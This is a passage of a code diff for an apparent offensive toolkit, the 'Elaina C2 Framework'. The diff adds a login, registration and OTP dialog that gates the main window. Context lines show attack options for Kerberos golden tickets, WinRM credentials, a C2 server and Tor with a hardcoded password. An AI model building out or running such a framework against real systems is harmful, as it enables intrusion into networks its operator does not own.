+        password = self.password_input.text()
+        otp = self.otp_input.text()
+        
+        if username and password:
+            auth_manager = AuthenticationManager()
+            if auth_manager.login(username, password, otp if otp else None):
+                self.login_successful.emit(username, password)
+                self.accept()
+            else:
+                self.status_label.setText("Invalid username, password, or OTP")
+        else:
+            self.status_label.setText("Please enter username and password")
+            
+    def attempt_register(self):
+        username = self.reg_username_input.text()
+        password = self.reg_password_input.text()
+        confirm_password = self.reg_confirm_password_input.text()
+        role = self.reg_role_combo.currentText()
+        
+        if username and password and confirm_password and role:
+            if password != confirm_password:
+                self.status_label.setText("Passwords do not match")
+                return
+                
+            auth_manager = AuthenticationManager()
+            if auth_manager.register(username, password, role):
+                self.status_label.setText("Registration successful. You can now login.")
+                self.tab_widget.setCurrentIndex(0)
+                self.username_input.setText(username)
+                self.password_input.setText("")
+                self.otp_input.setText("")
+            else:
+                self.status_label.setText("Registration failed. Username may already exist.")
+        else:
+            self.status_label.setText("Please fill in all fields")
+
 def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", use_burp=False, winrm_user=None, winrm_pass=None, pfx_path=None, pfx_password=None, 
             golden_ticket=False, gt_domain=None, gt_user=None, gt_krbtgt_hash=None, gt_sid=None, gt_dc_ip=None, gt_lifetime=10, gt_target=None, gt_command=None,
             c2_server=False, c2_host=None, c2_port=None, c2_ssl=False, c2_cert=None, c2_key=None,
@@ -6976,8 +7716,13 @@ def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", 
         app.setApplicationName("Elaina C2 Framework")
         app.setApplicationVersion("1.0")
         
-        main_window = EnhancedMainWindow()
-        main_window.show()
+        # Show login dialog first
+        login_dialog = LoginDialog()
+        if login_dialog.exec_() == QDialog.Accepted:
+            main_window = EnhancedMainWindow()
+            main_window.show()
+        else:
+            sys.exit(0)
         
         file_menu = main_window.menuBar().findChild(QMenu, "File")
         if file_menu:
@@ -7132,6 +7877,7 @@ def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", 
             f.write(json.dumps(full_log, indent=2))
     finally:
         driver.quit()
+
 def main():
     parser = argparse.ArgumentParser(description="ELAINA-C2-FRAMEWORK")
     parser.add_argument("url", help="Target URL to scan & attack", nargs='?', default=None)
@@ -7308,5 +8054,6 @@ def main():
             profile_path=args.profile_path,
             output_path=args.output_path
         )
+
 if __name__ == "__main__":
     main()
